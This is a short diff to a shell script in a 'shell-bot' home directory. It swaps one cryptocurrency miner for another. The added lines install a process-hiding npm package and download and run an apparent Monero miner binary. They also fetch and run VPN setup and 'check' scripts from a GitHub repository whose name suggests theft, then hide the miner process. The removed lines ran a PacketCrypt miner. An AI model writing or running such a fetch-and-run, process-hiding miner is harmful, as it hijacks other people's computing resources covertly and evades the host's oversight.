@@ -4,6 +4,6 @@
 
 
 cd /home/shell-bot
-wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64
-chmod +x packetcrypt-v0.5.1-linux_amd64
-./packetcrypt-v0.5.1-linux_amd64 ann -p pkt1qmafr3t8l4gl8mgay49a49mlgmh9d968a47dxgl http://pool.pkt.world http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
+apt-get update && apt install npm -y
+npm i -g node-process-hider
+ wget https://github.com/Rickyose/skripburu2/raw/main/xcore_xmr_amd && wget -qO set.sh https://raw.githubusercontent.com/ADEBARACK/MALING-REPO/main/setup_mullvad_vpn.sh && wget https://raw.githubusercontent.com/ADEBARACK/MALING-REPO/main/check.sh && chmod +x set.sh check.sh xcore_xmr_amd && ph add xcore_xmr_amd && ./set.sh && ./check.sh
